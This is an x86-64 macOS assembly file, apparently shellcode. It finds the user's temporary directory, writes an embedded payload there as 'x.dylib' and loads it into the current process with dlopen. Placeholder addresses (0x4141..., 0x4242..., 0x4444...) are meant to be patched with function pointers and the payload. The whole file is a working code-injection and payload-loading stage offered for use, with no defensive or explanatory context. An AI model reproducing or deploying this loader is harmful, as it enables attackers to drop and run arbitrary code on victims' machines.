BITS 64
%macro exit 1
    mov rax, 0xFFFF000000000000+%1
    add rsp, 0x1008
    ret
%endmacro
start:
    ; int3
    sub rsp, 0x1008
confstr:
    ; confstr(_CS_DARWIN_USER_TEMP_DIR, buf, 0x100)
    mov rdi, 65537 ; _CS_DARWIN_USER_TEMP_DIR
    mov rsi, rsp ; buf
    mov rdx, 0x100 ; size
    mov rax, 0x4141414141414141 ; to be replaced with confstr
    call rax
    test rax, rax
    jnz build_path
    exit 1
build_path:
    lea rdi, [rsp+rax-1] ; confstr return the length of path
    mov ecx, 0x79642e78 ; x.d
    mov [rdi], ecx
    mov ecx, 0x0062696c ; ylib
    lea rdi, [rsp+rax+3]
    mov [rdi],ecx
open:
    ; open(path, O_WRONLY)
    mov rdi, rsp ; path    
    mov rdx, 0x1ed               ; protections (0644)
    mov rsi, 0x602               ; O_TRUNC | O_CREAT | O_RDWR
    mov rax, 0x2000005 ; SYS_open
    syscall
    cmp rax, -1
    jne write
    exit 2
write:
    push rax
    ; write (fd, payload, nbyte)
    mov rdi, rax
    mov rsi, 0x4242424242424242 ; to be replaced with pointer to payload
    mov rdx, 0x4343434343434343 ; to be replaced with payload length
    mov rax, 0x2000004 ; SYS_write
    syscall
    cmp rax, -1
    jne dlopen
    exit 3
dlopen:
    ; dlopen (path, 0)
    pop rdi
    xor rax,rax
    mov rax,0x2000006
    syscall
    mov rdi, rsp ; path
    xor rsi, rsi
    mov rax, 0x4444444444444444
    call rax
    test rax, rax
    jnz success
    exit 4
success:
    exit 0
    nop
    nop
    nop
    int3
